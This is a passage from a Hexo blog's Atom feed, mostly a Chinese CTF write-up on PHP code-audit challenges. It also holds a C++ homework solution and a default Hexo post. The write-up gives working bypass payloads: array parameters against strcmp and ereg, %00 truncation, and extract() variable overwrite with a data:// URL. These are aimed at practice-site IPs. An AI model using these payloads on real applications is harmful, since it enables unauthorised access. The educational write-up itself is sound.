GET请求中的参数a是否已设置并且非NULL。strcmp函数将a参数与flag相比较，如果一致，则调用die函数。die函数的作用是打印die函数的参数，并立即停止该php后端的运行。那么我们的目标很明显，就是要让php执行到die函数，显示flag。<br>根据上题<strong>strcmp漏洞</strong>，我们可以直接利用数组绕过比如用<strong>”a[]=”</strong><br>解决：<a href="http://123.206.87.240:9009/6.php?a[]=" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php?a[]=</a> </p><hr><h1 id="ereg截断"><a href="#ereg截断" class="headerlink" title="ereg截断"></a>ereg截断</h1><p>打开链接同样是一个空白页面，根据给出的php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="分析代码：-4"><a href="#分析代码：-4" class="headerlink" title="分析代码："></a>分析代码：</h2><p>flag变量被设置为flag，即最终我们需要得到flag变量的内容从而达到真正的flag。<br>isset函数判断HTTP GET请求中的参数password是否已设置并且非NULL</p><h3 id="ereg-函数"><a href="#ereg-函数" class="headerlink" title="ereg()函数"></a>ereg()函数</h3> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> ereg ( string $pattern , string $string [, <span class="keyword">array</span> &amp;$regs ] ) : int</span><br><span class="line">函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回<span class="keyword">true</span>,否则,则返回<span class="keyword">false</span>。</span><br><span class="line">搜索字母的字符是大小写敏感的。</span><br><span class="line">&#125;</span><br><span class="line">ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) !== <span class="keyword">FALSE</span></span><br><span class="line">由第一个参数正则表达式可知该字符串从头到尾只允许出现字母与数字即a-z、A-Z、<span class="number">0</span><span class="number">-9.</span></span><br></pre></td></tr></table></figure><h3 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> strpos ( string $haystack , mixed $needle [, int $offset = <span class="number">0</span> ] ) : int</span><br><span class="line">查找字符串在另一字符串中第一次出现的位置。</span><br><span class="line">&#125;</span><br><span class="line">strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span></span><br><span class="line">该字符串必须有“*--*”字符。</span><br></pre></td></tr></table></figure><p>这两个条件明显发生冲突，<em>由于ereg()函数存在%00截断，即ereg()读取字符串时，当遇到%00会默认已经读完，不再读取后面的内容，这样我们就可以利用此漏洞在%00后添加“–”从而绕过正则检测。</em></p><p>解决：<a href="http://123.206.87.240:9009/19.php?password=12%00--" target="_blank" rel="noopener">http://123.206.87.240:9009/19.php?password=12%00--</a><br>同时，ereg()只能处理字符串，遇到数组做参数返回NULL，条件用强 === （要求两边类型相同），而NULL跟FALSE类型不同,顺利进入下一个条件；strpos()的参数也不能为数组，否则返回NULL，与FALSE类型不同，满足！==条件，故也可以直接传入一个数组。<br>解决：<a href="http://123.206.87.240:9009/19.php?password[]=" target="_blank" rel="noopener">http://123.206.87.240:9009/19.php?password[]=</a><br>（或<a href="http://123.206.87.240:9009/19.php?password[]=1只是一个为空值一个给了个值。）" target="_blank" rel="noopener">http://123.206.87.240:9009/19.php?password[]=1只是一个为空值一个给了个值。）</a></p><hr><h1 id="Extract"><a href="#Extract" class="headerlink" title="Extract"></a>Extract</h1><p>打开链接空白页面，分析给出的php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>;extract($_GET); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line">&#123; </span><br><span class="line">$content=trim(file_get_contents($flag)); </span><br><span class="line"><span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span><span class="string">'Oh.no'</span>; &#125; &#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a>extract()函数</h3><p>{<br>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>该函数返回成功设置的变量数目。<br><strong>但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉，这就造成了变量覆盖漏洞。</strong><br>}</p><h2 id="代码分析：-1"><a href="#代码分析：-1" class="headerlink" title="代码分析："></a>代码分析：</h2><p>将flag变量设置为xxx；<br>将GET 方法传输进来的值通过extract()函数处理；<br>isset函数判断HTTP GET请求中的参数shiyan是否已设置并且非NULL;<br>if 判断shiyan这个变量和content这个变量是否相等。content 的值是通过读取 flag 变量的值来获取的。如果这个两个变量相等输出 flag 。<br>file_get_contents() — 将整个文件读入一个字符串。<br>trim() — 去除字符串首尾处的空白字符（或者其他字符）。<br>解决：<br>由于我们不知道flag的值是什么？所以我们需要利用extract()函数漏洞，进行变量覆盖，重新给flag变量赋值。<br>只要我们构造的payload使得 $shiyan = $content ，其中 $content 的值又取决于 flag 变量，所以只要 shiyan变量相等于flag变量即可。由于file_get_contents($flag) 中的$flag是一个参数，导致$content的值是空值，所以我们可以构造如下payload：<br><a href="http://123.206.87.240:9009/1.php?shiyan=" target="_blank" rel="noopener">http://123.206.87.240:9009/1.php?shiyan=</a> </p><hr><p><em>这里再引一位大佬的解答：（代码稍有不同）<a href="https://zhouxinan.github.io/" target="_blank" rel="noopener">https://zhouxinan.github.io/</a></em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($sixstars)) &#123;</span><br><span class="line">    $content=trim(file_get_contents($flag));</span><br><span class="line">    <span class="keyword">if</span> ($sixstars==$content) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Oh.no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先，flag变量被设置为’xxx’，一个简单的字符串。<br>接着，后端运行了extract函数，从<code>$_GET</code>数组中将变量导入到当前的符号表。什么意思呢？其实很简单。比如如果我们访问了<a href="http://139.224.220.67:23900/dmsj/level2/?sixstars=1，那么`$_GET[&quot;sixstars&quot;]`的值为字符串1。执行`extract($_GET)`;时，就相当于执行了`$sixstars=&#39;1&#39;`。" target="_blank" rel="noopener">http://139.224.220.67:23900/dmsj/level2/?sixstars=1，那么`$_GET[&quot;sixstars&quot;]`的值为字符串1。执行`extract($_GET)`;时，就相当于执行了`$sixstars=&#39;1&#39;`。</a><br>然后，程序将会执行<code>isset($sixstars)</code>。我们看到，为了获取flag，必须执行到echo ‘flag{xxx}’;，所以<code>isset($sixstars)</code>的返回值必须为 TRUE。所以，我们必须通过<code>extract($_GET)</code>;将sixstars变量设置为任意值，即使是空字符串也可以。也就是说，即使访问<a href="http://139.224.220.67:23900/dmsj/level2/?sixstars=也是可以的。但绝对不能不包含sixstars参数。" target="_blank" rel="noopener">http://139.224.220.67:23900/dmsj/level2/?sixstars=也是可以的。但绝对不能不包含sixstars参数。</a><br>接着，程序将会执行<code>$content=trim(file_get_contents($flag));</code>。我们分步看。首先会执行<code>file_get_contents($flag)</code>。正常情况下，如果你不通过URL传入flag参数，那么，因为程序的最开始已经执行过<code>$flag=&#39;xxx&#39;</code>;，所以到了这里将会执行file_get_contents(‘xxx’)。file_get_contents函数可以“将整个文件读入一个字符串”。比如如下代码可以将<a href="http://www.example.com/网站的源代码读取到homepage变量中并显示出来。" target="_blank" rel="noopener">http://www.example.com/网站的源代码读取到homepage变量中并显示出来。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$homepage = file_get_contents(<span class="string">'http://www.example.com/'</span>);</span><br><span class="line"><span class="keyword">echo</span> $homepage;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着，php又会执行trim函数，它将会“去除字符串首尾处的空白字符（或者其他字符）”。<br>最后，php将会执行<code>if ($sixstars==$content)，</code>如果为TRUE，那么将会显示flag。<br>读到这里，你想必已经知道了我们该怎么做：首先，给sixstars变量传入一个值，比如1。然后，给flag变量传入一个我们能控制的网站的地址，并让这个我们能控制的网站的源代码设置为1。由于extract能起到“变量覆盖”的作用，在extract后，flag变量就会被覆盖为我们能控制的网站的地址，而不再是’xxx’，这样当执行到file_get_contents时php后端将会从我们能控制的网站上读取到1，并将其和sixstars变量比较，并返回TRUE，然后就能打印flag。<br>虽然这个方法是可行的，但是今天我要教你一个更简单的方法，那就是php伪协议。我们可以直接给flag变量传入data://text/plain,1。意思是明文1。这样file_get_contents(‘data://text/plain,1’)将会直接返回1，就不需要我们在公网上开一台服务器了。<br>所以，最后我们的payload是：<br>1    <a href="http://139.224.220.67:23900/dmsj/level2/?sixstars=1&amp;flag=data://text/plain,1" target="_blank" rel="noopener">http://139.224.220.67:23900/dmsj/level2/?sixstars=1&amp;flag=data://text/plain,1</a><br>这里再强调一下，给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP大法&quot;&gt;&lt;a href=&quot;#PHP大法&quot; class=&quot;headerlink&quot; title=&quot;PHP大法&quot;&gt;&lt;/a&gt;PHP大法&lt;/h1&gt;&lt;p&gt;（来源：实验吧  解题链接： &lt;a href=&quot;http://ctf5.shiyanbar.com/DUTCTF/i
      
    
    </summary>
    
      <category term="代码审计" scheme="https://singlemindedt.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="https://singlemindedt.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/"/>
    
    
      <category term="php" scheme="https://singlemindedt.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>加密算法</title>
    <link href="https://singlemindedt.github.io/2019/09/01/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://singlemindedt.github.io/2019/09/01/加密算法/</id>
    <published>2019-09-01T14:50:25.000Z</published>
    <updated>2019-09-01T14:50:25.208Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>反序列化</title>
    <link href="https://singlemindedt.github.io/2019/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://singlemindedt.github.io/2019/09/01/反序列化/</id>
    <published>2019-09-01T14:49:34.000Z</published>
    <updated>2019-09-01T14:49:35.039Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>xxe</title>
    <link href="https://singlemindedt.github.io/2019/09/01/xxe/"/>
    <id>https://singlemindedt.github.io/2019/09/01/xxe/</id>
    <published>2019-09-01T14:49:06.000Z</published>
    <updated>2019-09-01T14:49:06.023Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VPS</title>
    <link href="https://singlemindedt.github.io/2019/09/01/VPS/"/>
    <id>https://singlemindedt.github.io/2019/09/01/VPS/</id>
    <published>2019-09-01T14:47:52.000Z</published>
    <updated>2019-09-01T14:47:52.634Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>小雏鸟的成人式2</title>
    <link href="https://singlemindedt.github.io/2019/09/01/%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9Aone/"/>
    <id>https://singlemindedt.github.io/2019/09/01/算法作业one/</id>
    <published>2019-09-01T09:37:45.000Z</published>
    <updated>2019-09-05T14:24:01.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>陶行知先生说：“我们要活的书，不要死的书 ”。</p><p>小雏鸟们从书上都是对的到现在能去伪存真的去使用书籍，证明你们长大了。总之就是要有自己的主见，自己的思考。</p><p>大白希望大家都能拿到一百分，所以对100这个数以及他的倍数很喜欢。</p><p>大白发现，从1开始，一定能找出一个序列从小到大排列，使得每一项都是 恰好能且仅能 被100整除D次。</p><p>请你编写程序，找到这个数列里第N个数。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>多行。每行输入两个整数，表示D和N，N范围[1,100]，D范围[0,2]</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>每行对应输入，给出一个符合题意的整数</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">5</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">11</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">85</span></span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">1100</span></span><br><span class="line"><span class="number">850000</span></span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>###思路：很容易想到计算方法，其中N=100的情况需要注意，在下面带代码中给出。</p><h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a><strong>题解：</strong></h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> D,N;<span class="comment">//pow(double,double)</span></span><br><span class="line"><span class="keyword">double</span> n;  <span class="comment">//避免损失精度 </span></span><br><span class="line">                 <span class="comment">//int s;//最后由于要得到整数而非科学记数法，故需要强制转换一下</span></span><br><span class="line">           <span class="comment">//如：2 100 得到1.01e+006转化之后为1010000 </span></span><br><span class="line">           <span class="comment">//***也可以直接cout&lt;&lt;int(n)转化输出结果 </span></span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;D&gt;&gt;N)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>&lt;=N&amp;&amp;N&lt;<span class="number">100</span>&amp;&amp;<span class="number">0</span>&lt;=D&amp;&amp;D&lt;=<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">n=N*(<span class="built_in">pow</span>(<span class="number">100</span>,D));</span><br><span class="line">               <span class="comment">//s=n;</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">int</span>(n)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(N=<span class="number">100</span>&amp;&amp;<span class="number">0</span>&lt;=D&amp;&amp;D&lt;=<span class="number">2</span>)<span class="comment">//当N=100用原来的算法会使结果整除次数加1</span></span><br><span class="line">    &#123;</span><br><span class="line">    n=<span class="number">101</span>*(<span class="built_in">pow</span>(<span class="number">100</span>,D));</span><br><span class="line">    <span class="comment">//s=n;</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="keyword">int</span>(n)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://dev.tencent.com/u/Single-minded_T/p/daerduotutu/git/raw/master/%E5%B0%8F%E9%9B%8F%E9%B8%9F%E7%9A%84%E6%88%90%E4%BA%BA%E5%BC%8F2.PNG" alt="Demo"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;陶行知先生说：“我们要活的书，不要死的书 ”。&lt;/p&gt;
&lt;p&gt;小雏鸟们从书上都是对的到现在能去伪存真的去使用书籍，证明你们长
      
    
    </summary>
    
      <category term="算法" scheme="https://singlemindedt.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://singlemindedt.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://singlemindedt.github.io/2019/08/31/hello-world/"/>
    <id>https://singlemindedt.github.io/2019/08/31/hello-world/</id>
    <published>2019-08-30T16:00:00.000Z</published>
    <updated>2019-09-05T14:30:35.937Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://singlemindedt.github.io/tags/Hexo/"/>
    
  </entry>
  
</feed>
